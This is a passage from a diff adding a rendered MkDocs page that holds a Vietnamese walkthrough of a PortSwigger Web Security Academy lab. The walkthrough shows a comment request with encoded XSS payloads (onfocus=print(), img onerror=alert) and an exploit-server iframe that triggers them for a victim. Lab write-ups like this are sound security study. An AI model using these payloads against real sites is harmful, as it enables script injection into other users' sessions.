+<span class="nv">csrf</span><span class="o">=</span>Befz2s4NEYkjKsOemqDEx79my9GM3WQE<span class="p">&amp;</span><span class="nv">postId</span><span class="o">=</span><span class="m">1</span><span class="p">&amp;</span><span class="nv">comment</span><span class="o">=</span>%3cform%20id%3d%22xyz%22%20%20tabindex%3d0%20onfocus%3dprint<span class="o">()</span>%3e%3cinput%20id%3dattributes%3e%3c%2fform%3e<span class="p">&amp;</span><span class="nv">name</span><span class="o">=</span>%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E<span class="p">&amp;</span><span class="nv">email</span><span class="o">=</span>a%40a.com<span class="p">&amp;</span><span class="nv">website</span><span class="o">=</span>http%3A%2F%2Fa.com
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Điều hướng đến bài post vừa comment, nhấn vào <code>Click me!</code> comment vừa rồi và print thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2028.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request sau để victim truy cập vào trang có sẵn payload của chúng ta bằng exploit server</p>
+<ul>
+<li>
+<p>Exploit</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code>&lt;iframe
+<span class="w">  </span><span class="nv">src</span><span class="o">=</span><span class="s2">&quot;https://0a3400ca032176df80380323007c000a.web-security-academy.net/post?postId=1&quot;</span>
+<span class="w">  </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;width:1000px;height:1000px&quot;</span>
+<span class="w">  </span><span class="nv">onload</span><span class="o">=</span><span class="s2">&quot;this.src=this.src+&#39;#xyz&#39;&quot;</span>&gt;
+&lt;/iframe&gt;
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện view exploit nhận thấy print được auto gọi</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2029.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện deliver to victim, quan sát thấy solve lab thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2030.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
